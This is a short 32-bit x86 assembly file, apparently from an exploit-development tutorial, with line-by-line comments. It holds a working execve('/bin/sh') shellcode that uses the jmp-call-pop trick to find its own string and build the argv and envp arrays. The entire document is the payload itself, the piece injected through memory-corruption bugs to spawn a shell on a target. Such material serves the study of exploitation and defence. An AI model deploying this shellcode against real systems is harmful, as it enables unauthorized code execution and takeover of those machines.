BITS 32

  jmp short two

one:
; execve(const char *pathname, char *const argv [], char *const envp[])
  pop ebx               ; pop the string address from stack
  xor eax, eax          ; zero out eax
  mov [ebx+7], al       ; null terminate the /bin/sh string
  mov [ebx+8], ebx      ; put 4-byte string address in AAAA [ebx+8]
  mov [ebx+12], eax     ; put 4-byte null terminator in BBBB [ebx+12]
  lea ecx, [ebx+8]      ; load the address of [ebx+8] into ecx for argv ptr
  lea edx, [ebx+12]     ; edx = ebx + 12, which is the envp ptr
  mov al, 11            ; syscall #11 -> execve
  int 0x80              ; start syscall

two:
  call one              ; Call trick to get the string address
  db '/bin/shXAAAABBBB' ; X -> null byte, AAAA -> argv array, BBBB -> envp array
